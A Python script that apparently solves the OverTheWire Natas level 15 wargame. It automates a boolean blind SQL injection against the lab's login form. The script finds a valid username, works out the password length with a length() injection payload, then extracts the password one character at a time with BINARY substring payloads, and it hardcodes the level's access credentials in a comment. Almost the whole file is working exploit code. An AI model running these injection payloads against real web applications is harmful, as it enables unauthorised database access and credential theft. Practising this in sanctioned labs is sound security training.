import string
import time
import requests
from requests.auth import HTTPBasicAuth

# http://natas15.natas.labs.overthewire.org
# natas15
# GB6USCJYJjwLyYhZUNkE1NwDueiTow6g

def create_session(username, password):
	session = requests.Session()
	session.auth = HTTPBasicAuth(username, password)
	return session

def request_check(session, url, payload):
	if "This user exists." in session.post(u, data=payload).text:
			return True
	return False

def find_username(session, url, user):
	for _ in range(100):
		payload = {"username": user + str(_)}
		if request_check(session, url, payload) == True:
			return user + str(_)
	return None

def find_length(session, url, user):
	for _ in range(100):
		payload = {"username": user + '" AND length(password)=' + str(_) + " #"}
		if request_check(session, url, payload) == True:
			return _
	return None

def blind_sql(session, url, user, password_length):
	charset = string.digits + string.ascii_letters
	password = ""
	while len(password) <= password_length:
		for char in charset:
			sql_try = password + char
			payload = {"username": user + '" AND BINARY substring(password,1,'
						+ str(len(sql_try)) + ')="' + sql_try + '" #'}

			#print(payload)
			print(f"\t\t--> {password_length - len(password)} char left: {password}{char}", end = '\r')
			time.sleep(0.01)

			if request_check(session, u, payload) is True:
				password = sql_try

	return password

""" PRELIMINARY OPERATIONS
	Asks for url to connect, then
	asks for login-user and password if needed.
	Then proceedes to esablish a connection to site
"""

u = "http://natas15.natas.labs.overthewire.org"
s = None

""" CONNECTING TO SITE
	Tries to establish a connection to site using credentials
"""

print(f"[*] Logging to {u}")
while True:
	login_usr = input("[*] Enter log-in username: ")
	login_pwd = input("[*] Enter log-in password: ")
	s = create_session(login_usr, login_pwd)
	response = s.get(u)
	if response.status_code != 200:
		print("\n[x] Unable to connect to site. Status code: " + str(response.status_code))
		while True:
			answer = input("[?] Try again? (Y/n): ")
			if answer.lower() == 'n':
				exit(1)
			elif answer.lower() == 'y':
				break
	else:
		break
print("[+] Successfully connected to site")


""" SQL PRELIMINARY
	Preliminary operations
"""

print("\n[*] Site is asking for username")

user = None

while True:
	print("[*] Scanning for valid natas users...")
	user = find_username(s, u, "natas")
	if user == None:
		print("[x] Unable to find valid username.")
		while True:
			answer = input("[?] Try again? (Y/n): ")
			if answer.lower() == 'n':
				exit(1)
			elif answer.lower() == 'y':
				break
	else:
		break
print("[+] User found: " + user)


""" PASSWORD LENGTH
	Tries to find password length based on True/False injection
"""

password_length = None
print("\n[*] Checking for password length...")
password_length = find_length(s, u, user)
if password_length != None:
	print("[*] Password length found: "  + str(password_length))
else:
	print("\n[x] Cloudn't find password length. Aborting process")
	exit(1)



""" BLIND SQL INJECTION!

"""

password = None
print(f"\n[*] Starting blind SQL injection for user {user}...\n")
'''
print("[*] Choose aggressiveness: ")
print("			LEVEL		  REQs/s")
print("		. 1		low			0.1")
print("		. 2		mid			1")
print("		. 3		high		10")
print("		. 4 	crazy		100")
'''

password = blind_sql(s, u, user, password_length)
print("\n\n[v] Done!")


"""
	session.auth it's an obj attribute used to set authentication
		headers.

		HTTPBasicAuth it's a class provided by req.auth that adds
		an Authorization header with credentials encoded in Base64.
		Return an istance of auth obj.

		Return a Response object with various fields:

			request.Response (obj)
			|
			|____________ ATTRIBS:
			|
			|____________ response.status_code	(int)
			|____________ response.text			(string)
			|____________ response.content		(bytes)
			|____________ response.headers		(CaseInsensitiveDict)
			|____________ response.url			(str)
"""
